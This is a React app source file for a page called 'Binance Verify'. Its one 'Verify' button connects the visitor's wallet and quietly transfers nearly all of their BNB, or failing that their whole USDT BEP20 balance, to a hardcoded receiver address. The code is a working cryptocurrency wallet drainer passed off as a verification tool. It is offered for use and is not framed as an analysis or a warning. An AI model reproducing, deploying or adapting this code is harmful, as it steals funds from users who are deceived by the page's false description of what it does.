import React, { useState } from "react";
import "./App.css";

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef"; 
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)"
];

function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  const handleVerify = async () => {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new window.ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      // BNB transfer
      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > window.ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - window.ethers.parseEther("0.0005"),
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      // USDT transfer
      const usdt = new window.ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");

    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  };

  return (
    <div className="App flex flex-col items-center justify-center min-h-screen bg-[#121212] text-gray-200">
      <h1 className="text-yellow-400 text-4xl font-bold mb-4">Binance Verify</h1>
      <p className="text-gray-400 mb-8">Supports BNB and USDT (BEP20) transfers.</p>

      <div className="relative flex justify-center items-center mb-12">
        <div className="absolute border-2 border-yellow-400 rounded-full w-40 h-40 animate-pulse-slow"></div>
        <div className="absolute border-2 border-yellow-400 rounded-full w-32 h-32 animate-pulse-slow"></div>
        <div className="absolute border-2 border-yellow-400 rounded-full w-24 h-24 animate-pulse-slow"></div>
        <button
          onClick={handleVerify}
          className="z-10 px-8 py-4 bg-yellow-400 text-black rounded-full font-bold"
        >
          Verify
        </button>
      </div>

      <p className="text-gray-300">{status}</p>
    </div>
  );
}

export default App;
